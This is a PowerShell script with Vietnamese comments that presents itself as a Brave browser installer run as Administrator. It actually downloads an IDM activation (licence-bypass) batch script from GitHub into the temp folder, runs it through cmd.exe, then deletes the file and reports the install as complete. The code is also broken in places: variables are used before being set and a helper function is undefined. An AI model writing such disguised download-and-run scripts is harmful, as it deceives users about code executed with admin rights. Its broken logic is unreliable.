# Script để tải xuống và cài đặt Brave
# Chạy với quyền quản trị viên (Run as Administrator)

$Path = $ENV:TEMP

Write-Host "Dang tai xuong Brave..."

# Tải file cài đặt
Invoke-WebRequest "https://raw.githubusercontent.com/hiepvk/IDM-Activation-Script/main/IASL.cmd" -OutFile "$Path"
Invoke-WebRequest "https://raw.githubusercontent.com/hiepvk/IDM-Activation-Script/main/src/banner_art.txt" -OutFile "$Path\src"

Write-Host "Da tai xuong thanh cong."
Write-Host "Dang bat dau qua trinh cai dat..."

# Run the installer in silent mode with administrator privileges
$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
$chkcmd = & $env:ComSpec /c "echo CMD is working"
if ($chkcmd -notcontains "CMD is working") {
    Write-Warning "cmd.exe is not working.`nReport this issue at $troubleshoot"
}
saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" $args""" -Wait
CheckFile $FilePath

$FilePaths = @("$env:SystemRoot\Temp\IASL.cmd", "$env:USERPROFILE\AppData\Local\Temp\IASL.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }

Write-Host "Cai dat hoan tat."


